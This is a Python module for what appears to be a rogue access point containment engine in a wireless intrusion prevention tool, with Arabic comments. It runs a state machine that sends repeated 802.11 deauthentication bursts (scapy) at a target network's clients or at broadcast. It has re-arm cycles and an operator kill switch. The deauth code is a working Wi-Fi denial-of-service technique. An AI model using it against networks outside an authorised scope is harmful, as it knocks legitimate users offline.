import time
import threading
from enum import Enum
import config
from config import DEAUTH_COUNT, DEAUTH_INTERVAL, AutoContainmentConfig
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, conf
from runtime_state import client_kicked, log_attack, update_status

class AttackState(Enum):
    MONITORING = "MONITORING"
    ATTACKING = "ATTACKING"
    EVALUATING = "EVALUATING"
    RE_ARMING = "RE_ARMING"
    KILLED = "KILLED"

class ContainmentEngine:
    def __init__(self, iface=None, ack_callback=None):
        self.iface = iface or config.get_interface()
        self.ack_callback = ack_callback
        
        # State Machine Tracking
        self.state = AttackState.MONITORING
        self.current_target_bssid = None
        self.current_target_score = 0
        self.current_target_channel = None
        self.current_target_ssid = None
        self.current_target_clients = None
        self.state_start_time = time.time()
        self.cycle_count = 0
        
        # Threading mechanisms
        self.lock = threading.Lock()
        self.attack_thread = None
        self.daemon_running = False
        self._kill_flag = False

    def _transition(self, new_state: AttackState, reason: str, bssid: str = None):
        """Helper to handle state transitions and emit the event securely."""
        with self.lock:
            old_state = self.state
            self.state = new_state
            self.state_start_time = time.time()
            event_bssid = bssid or self.current_target_bssid
            
        if self.ack_callback:
            # Format: status, bssid, reason, ssid, channel
            self.ack_callback(new_state.value, event_bssid, reason, self.current_target_ssid, self.current_target_channel)
            
        log_attack(f"Engine State Changed: {old_state.value} -> {new_state.value} ({reason})", event_bssid)

    def evaluate_threat(self, bssid, score, channel, ssid=None, clients=None):
        """Called by ThreatManager to notify the engine of an active rogue."""
        with self.lock:
            current_state = self.state
            current_bssid = self.current_target_bssid
            current_score = self.current_target_score
            
        # Preemption: If we are attacking but a MUCH worse threat appears
        if current_state in [AttackState.ATTACKING, AttackState.EVALUATING]:
            if bssid != current_bssid and score >= (current_score + 20):
                self._kill_flag = True # signal current loop to stop
                self._transition(AttackState.RE_ARMING, f"Preempted by {bssid} (score: {score})", bssid)
                with self.lock:
                    self.current_target_bssid = bssid
                    self.current_target_score = score
                    self.current_target_channel = channel
                    self.current_target_ssid = ssid
                    self.current_target_clients = clients
                    self.cycle_count = 0
                self._transition(AttackState.ATTACKING, "Starting preemptive attack")
                return

        # Start attack if idle
        if current_state == AttackState.MONITORING:
            with self.lock:
                self.current_target_bssid = bssid
                self.current_target_score = score
                self.current_target_channel = channel
                self.current_target_ssid = ssid
                self.current_target_clients = clients
                self.cycle_count = 0
                self._kill_flag = False
            self._transition(AttackState.ATTACKING, "Threat exceeded threshold. Engaging.")
            
        # Re-arm if threat persists during evaluation
        elif current_state == AttackState.EVALUATING and bssid == current_bssid:
            with self.lock:
                elapsed = time.time() - self.state_start_time
            if elapsed >= AutoContainmentConfig.EVALUATION_PAUSE_SEC:
                with self.lock:
                    self.cycle_count += 1
                if self.cycle_count < AutoContainmentConfig.MAX_RE_ARM_CYCLES:
                    self._transition(AttackState.ATTACKING, f"Threat persists. Re-arming (Cycle {self.cycle_count+1}/{AutoContainmentConfig.MAX_RE_ARM_CYCLES})")
                else:
                    self._transition(AttackState.MONITORING, "Max re-arm cycles reached. Halting auto-containment.")
                    with self.lock:
                        self.current_target_bssid = None
                        self.current_target_score = 0

    def execute_kill(self, bssid, kill_token):
        """Emergency kill switch invoked by operator."""
        with self.lock:
            if self.current_target_bssid == bssid:
                self._kill_flag = True
                self._transition(AttackState.KILLED, f"Operator invoked Kill Switch (Token: {kill_token})")
                self.current_target_bssid = None
                self.current_target_score = 0
                config.LOCKED_CHANNEL = None

    def start_daemon(self):
        """Starts the background worker that processes the state machine."""
        if self.daemon_running:
            return
        self.daemon_running = True
        t = threading.Thread(target=self._daemon_loop, daemon=True, name="ContainmentDaemon")
        t.start()

    def _daemon_loop(self):
        """المحرك الرئيسي للهجوم - هو ده اللي بيحدد وتيرة الضرب والتقييم"""
        while self.daemon_running:
            with self.lock:
                state = self.state
                bssid = self.current_target_bssid
                channel = self.current_target_channel
                clients = self.current_target_clients
                elapsed = time.time() - self.state_start_time
                kill_signal = self._kill_flag
                
            if state == AttackState.ATTACKING and bssid and not kill_signal:
                # 1. هجوم متواصل: السنسور بيفضل يبعت Deauth Waves بدون توقف
                self._deauth_burst(bssid, channel, clients)
                
                # 2. الاستمرارية: بيفضل يضرب لحد ما يخلص وقت الـ Cycle (مثلاً 15 ثانية)
                if elapsed >= AutoContainmentConfig.ATTACK_CYCLE_DURATION_SEC:
                    self._transition(AttackState.EVALUATING, "Cycle complete. Pausing for quick evaluation.")
                    config.LOCKED_CHANNEL = None # سيب السنيفر يشوف باقي الشبكات
                
                # فاصل زمني "مللي ثانية" بين الموجات عشان الكارت ما يهنجش
                time.sleep(config.DEAUTH_INTERVAL)
                    
            elif state == AttackState.EVALUATING:
                # 3. التقييم الخاطف: 3 ثواني بس بدل 15 عشان الجهاز ما يلحقش يرجع
                if elapsed > 3: 
                     self._transition(AttackState.MONITORING, "Evaluation finished. Re-checking targets.")
                     with self.lock:
                         self.current_target_bssid = None # تصفير الهدف عشان يرجع يختاره لو لسه موجود

            elif state == AttackState.MONITORING:
                # في حالة السكون، انتظر نصف ثانية قبل الفحص القادم
                time.sleep(0.5)

    def _deauth_burst(self, bssid, channel, clients=None):
        if not channel:
            return
            
        targets = clients if clients else ["ff:ff:ff:ff:ff:ff"]
        pkts = []
        for target in targets:
            pkts.append(RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))
            pkts.append(RadioTap() / Dot11(addr1=bssid, addr2=target, addr3=bssid) / Dot11Deauth(reason=7))

        l2_socket = None
        try:
            l2_socket = conf.L2socket(iface=self.iface)
            # إرسال موجة سريعة
            for p in pkts:
                l2_socket.send(p)
            
            # تحديث العداد واللوجات (التعديل المهم لظهور اللوجات لايف)
            from runtime_state import log_attack, client_kicked
            client_kicked() # زيادة عداد الـ Hits
            
            # إرسال الخبر للـ Queue عشان يظهر في التيرمينال فوراً
            from core.event_bus import dashboard_queue
            dashboard_queue.put({
                "type": "ATTACK_LOG",
                "bssid": bssid,
                "message": f"🔥 Sending Deauth Wave to {bssid} (Targets: {len(targets)})",
                "timestamp": time.time()
            })
                
        except Exception as e:
            LOGGER.error(f"Interface error during burst: {e}")
        finally:
            if l2_socket:
                try: l2_socket.close()
                except: pass